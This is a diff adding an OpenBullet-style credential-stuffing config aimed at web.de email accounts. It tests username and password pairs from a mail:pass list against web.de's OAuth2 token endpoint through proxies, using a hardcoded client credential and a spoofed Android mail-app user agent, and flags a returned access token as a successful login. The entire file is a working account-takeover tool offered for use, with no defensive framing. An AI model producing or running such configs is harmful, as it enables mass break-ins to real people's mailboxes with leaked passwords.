@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "web.de",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-09T02:30:01.3972235+04:30",
+  "AdditionalInfo": "",
+  "Author": "Im3eyyeD",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#U FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+#P FUNCTION Constant "<PASS>" -> VAR "P" 
+
+#len FUNCTION Constant "grant_type=password&username=<U>&password=<P>&device_name=google+G011A" -> VAR "len" 
+
+#POST REQUEST POST "https://oauth2.web.de/token" 
+  CONTENT "grant_type=password&username=<U>&password=<P>&device_name=google+G011A" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Authorization: Basic d2ViZGVfbWFpbGFwcF9hbmRyb2lkOnRtQVM3aUpXQ0syUElYNWVGa1JJUm9vdmRhN25HcnNJTXpIeThBRkM=" 
+  HEADER "User-Agent: webde.android.androidmail/6.13.8 Dalvik/2.1.0 (Linux; U; Android 5.1.1; G011A Build/LMY48Z)" 
+  HEADER "X-UI-APP: webde.android.androidmail/6.13.8" 
+  HEADER "Content-Type: application/x-www-form-urlencoded;charset=\"UTF-8\"" 
+  HEADER "Content-Length: <len>" 
+  HEADER "Host: oauth2.web.de" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error_description\":\"Perm.ACCOUNT_NOT_FOUND_OR_PASSWORD_WRONG\",\"error\":\"invalid_grant\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+
